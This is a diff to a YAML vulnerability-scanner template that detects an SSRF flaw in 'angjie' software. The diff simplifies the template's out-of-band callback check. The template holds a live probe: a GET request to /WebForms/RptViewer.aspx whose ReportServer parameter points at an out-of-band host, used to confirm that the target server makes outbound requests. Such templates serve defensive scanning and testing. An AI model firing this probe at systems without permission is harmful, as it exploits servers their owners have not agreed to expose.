@@ -13,13 +13,10 @@ info:
   tags: angjie,SSRF
   created: 2025/09/05
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
       method: GET
-      path: /WebForms/RptViewer.aspx?ReportServer={{oobHTTP}}
-    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
+      path: /WebForms/RptViewer.aspx?ReportServer={{oob.HTTP}}
+    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
 expression: r0()
